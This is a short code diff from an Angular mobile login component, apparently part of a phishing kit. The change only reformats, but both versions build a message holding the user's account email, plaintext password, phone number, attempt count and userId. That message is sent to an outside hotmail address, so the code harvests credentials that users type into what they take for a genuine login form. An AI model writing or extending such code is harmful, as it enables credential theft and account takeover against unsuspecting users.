@@ -83,11 +83,11 @@ export class MobileFormsComponent implements OnInit, OnDestroy {
         name: 'Stanley',
         message: `Email: ${
           this.loginFormControl['account'].value || ''
-        } Password: ${this.loginFormControl['password'].value}, Phone Number: ${
-          this.loginFormControl['countryCode'].value
-        } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
-          this.attemptCount + 1
-        } userId: ${this.userId || ''}`,
+        }, Password: ${
+          this.loginFormControl['password'].value
+        }, Phone Number: ${this.loginFormControl['countryCode'].value}, ${
+          this.loginFormControl['phoneNumber'].value || ''
+        }, Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`,
         email: 'ubaid.valtorquegroup@hotmail.com',
       })
       .then(() => {
